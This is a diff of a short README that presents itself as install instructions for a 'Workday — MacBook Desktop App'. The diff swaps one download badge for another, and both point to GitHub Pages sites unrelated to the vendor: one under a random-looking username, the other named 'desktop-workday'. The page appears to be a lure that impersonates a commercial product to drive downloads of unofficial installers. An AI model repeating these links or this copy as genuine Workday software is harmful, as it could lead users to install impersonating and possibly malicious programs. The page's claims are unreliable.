@@ -1,9 +1,8 @@
 # Workday — MacBook Desktop App
-![logo-workday-banner](https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/Workday_logo.svg/2560px-Workday_logo.svg.png)
 
 Workday is a powerful human capital management and financial management platform 🌟. You can install Workday on your MacBook following the instructions below to streamline HR, payroll, and finance workflows efficiently.  
 
-> [![Get for macOS — GitHub Style](https://img.shields.io/badge/Get%20for%20macOS-Get%20Installer-24292e?style=for-the-badge&logo=github&logoColor=white&labelColor=0d1117)](https://koaguerrerokxrg.github.io/.github/Workday-MacBook-Desktop)
+[![Try Workday](https://img.shields.io/badge/Try-Workday-087F5B?style=flat-square)](https://desktop-workday.github.io/.github/)
 
 
 ---
